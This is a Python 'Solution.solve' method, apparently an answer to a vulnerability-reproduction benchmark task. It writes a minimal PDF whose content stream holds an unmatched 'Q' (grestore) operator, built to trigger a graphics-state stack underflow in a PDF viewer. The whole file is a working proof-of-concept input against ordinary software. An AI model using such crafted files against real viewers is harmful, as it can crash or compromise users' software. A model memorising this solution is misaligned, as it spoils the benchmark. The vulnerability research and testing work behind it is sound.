class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # The vulnerability is described as an attempt to restore viewer state
        # without checking the viewer depth. This points to a stack underflow
        # caused by a restore operation without a corresponding save.
        # In PDF content streams, the 'Q' (grestore) operator restores the
        # graphics state, while 'q' (gsave) saves it.
        # A minimal PoC should therefore be a valid PDF file whose content
        # stream contains a 'Q' operator without a preceding 'q'.

        # The malicious content is just the grestore operator.
        stream_content = b"Q"

        # We construct the necessary PDF objects to create a valid, viewable page.
        # The structure is standard: Catalog -> Pages -> Page -> Content Stream.
        # Object 1: Catalog (Root of the document)
        # Object 2: Pages Tree (Contains all pages)
        # Object 3: Page (A single page)
        # Object 4: Content Stream (Contains the drawing operators, including our payload)
        objects = [
            b"<</Type/Catalog/Pages 2 0 R>>",
            b"<</Type/Pages/Kids[3 0 R]/Count 1>>",
            b"<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Contents 4 0 R>>",
            b"<</Length %d>>stream\n%s\nendstream" % (len(stream_content), stream_content),
        ]

        header = b"%PDF-1.4\n"
        body = b""
        offsets = []
        
        current_offset = len(header)
        
        # Build the PDF body by concatenating object definitions.
        # We also record the byte offset of each object for the xref table.
        for i, obj_content in enumerate(objects):
            obj_num = i + 1
            obj_str = b"%d 0 obj\n%s\nendobj\n" % (obj_num, obj_content)
            
            offsets.append(current_offset)
            body += obj_str
            current_offset += len(obj_str)
            
        pdf_body = header + body
        
        # The xref table provides random access to objects in the file.
        xref_offset = len(pdf_body)
        num_objects = len(objects) + 1  # +1 for the mandatory null object 0
        
        xref_table = b"xref\n0 %d\n" % num_objects
        xref_table += b"0000000000 65535 f \n"  # Object 0 is always the free list head.
        
        for offset in offsets:
            xref_table += b"%010d 00000 n \n" % offset
            
        # The trailer provides the location of the xref table and the root object.
        trailer = b"trailer\n"
        trailer += b"<</Size %d/Root 1 0 R>>\n" % num_objects
        trailer += b"startxref\n"
        trailer += b"%d\n" % xref_offset
        trailer += b"%%EOF"
        
        return pdf_body + xref_table + trailer